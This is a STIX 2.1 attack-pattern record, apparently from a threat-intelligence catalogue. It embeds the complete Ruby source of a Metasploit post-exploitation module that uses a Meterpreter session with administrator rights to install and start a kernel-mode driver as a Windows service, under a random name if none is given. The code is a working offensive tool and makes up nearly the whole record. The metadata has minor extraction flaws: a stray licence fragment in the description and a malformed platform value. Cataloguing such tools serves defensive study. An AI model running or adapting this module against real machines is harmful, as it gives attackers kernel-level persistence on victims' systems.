{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d07ae769-c535-4691-ad5d-9e863c4102a8",
    "created": "2024-08-14T16:33:04.987094Z",
    "modified": "2024-08-14T16:33:04.987097Z",
    "name": "Windows Manage Driver Loader",
    "description": " This module loads a KMD (Kernel Mode Driver) using the Windows Service API.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/manage/driver_loader.rb",
            "external_id": "driver_loader.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Services\n  include Msf::Post::Windows::Error\n\n  START_TYPE = {\n    'demand' => 'SERVICE_DEMAND_START',\n    'boot' => 'SERVICE_BOOT_START',\n    'auto' => 'SERVICE_AUTO_START',\n    'disabled' => 'SERVICE_DISABLED',\n    'system' => 'SERVICE_SYSTEM_START'\n  }\n\n  ERROR_TYPE = {\n    'critical' => 'SERVICE_ERROR_CRITICAL',\n    'normal' => 'SERVICE_ERROR_NORMAL',\n    'severe' => 'SERVICE_ERROR_SEVERE',\n    'ignore' => 'SERVICE_ERROR_IGNORE'\n  }\n\n  SERVICE_TYPE = {\n    'kernel' => 'SERVICE_KERNEL_DRIVER',\n    'file_system' => 'SERVICE_FILE_SYSTEM_DRIVER',\n    'adapter' => 'SERVICE_ADAPTER',\n    'recognizer' => 'SERVICE_RECOGNIZER_DRIVER'\n  }\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Manage Driver Loader',\n        'Description' => %q{\n          This module loads a KMD (Kernel Mode Driver) using the Windows Service API.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => 'Borja Merino <bmerinofe[at]gmail.com>',\n        'Platform' => 'win',\n        'SessionTypes' => [ 'meterpreter' ]\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('DRIVER_PATH', [true, 'Driver path in %SYSTEMROOT%. Example: c:\\\\windows\\\\system32\\\\msf.sys']),\n        OptString.new('DRIVER_NAME', [false, 'Driver Name.']),\n        OptEnum.new('START_TYPE', [true, 'Start type.', 'auto', [ 'boot', 'system', 'auto', 'demand', 'disabled']]),\n        OptEnum.new('SERVICE_TYPE', [true, 'Service type.', 'kernel', [ 'kernel', 'file_system', 'adapter', 'recognizer']]),\n        OptEnum.new('ERROR_TYPE', [true, 'Error type.', 'ignore', [ 'ignore', 'normal', 'severe', 'critical']])\n      ]\n    )\n  end\n\n  def run\n    driver = datastore['DRIVER_PATH']\n    start = START_TYPE[datastore['START_TYPE']]\n    error = ERROR_TYPE[datastore['ERROR_TYPE']]\n    service = SERVICE_TYPE[datastore['SERVICE_TYPE']]\n\n    name = datastore['DRIVER_NAME'].blank? ? Rex::Text.rand_text_alpha((rand(6..13))) : datastore['DRIVER_NAME']\n\n    unless is_admin?\n      print_error(\"Administrator or better privileges needed. Try 'getsystem' first.\")\n      return\n    end\n\n    unless driver =~ Regexp.new(Regexp.escape(expand_path('%SYSTEMROOT%')), Regexp::IGNORECASE)\n      print_error('The driver must be inside %SYSTEMROOT%.')\n      return\n    end\n\n    unless file_exist?(driver)\n      print_error(\"Driver #{driver} does not exist.\")\n      return\n    end\n\n    inst = install_driver(name, path: driver, starttype: start, error_control: error, service_type: service)\n\n    if inst == Windows::Error::SUCCESS\n      ss = service_start(name)\n      case ss\n      when Windows::Error::SUCCESS\n        print_good('Driver loaded successfully.')\n      when Windows::Error::SERVICE_ALREADY_RUNNING\n        print_error('Service already started.')\n      when Windows::Error::SERVICE_DISABLED\n        print_error('Service disabled.')\n      else\n        print_error('There was an error starting the service.')\n      end\n    end\n  end\n\n  def install_driver(name, opts = {})\n    rc = service_create(name, opts)\n\n    if rc == Windows::Error::SUCCESS\n      print_status(\"Service object \\\"#{name}\\\" added to the Service Control Manager database.\")\n      return true\n    elsif rc == Windows::Error::SERVICE_EXISTS\n      print_error('The specified service already exists.')\n      # Show ImagePath just to know if the service corresponds to the desired driver.\n      service = service_info(name)\n      print_error(\"Path of driver file in \\\"#{name}\\\" service: #{service[:path]}.\")\n    else\n      print_error(\"There was an error opening the driver handler. GetLastError=#{rc}.\")\n    end\n    return false\n  end\nend\n",
    "x_mitre_platforms": [
        "win'"
    ]
}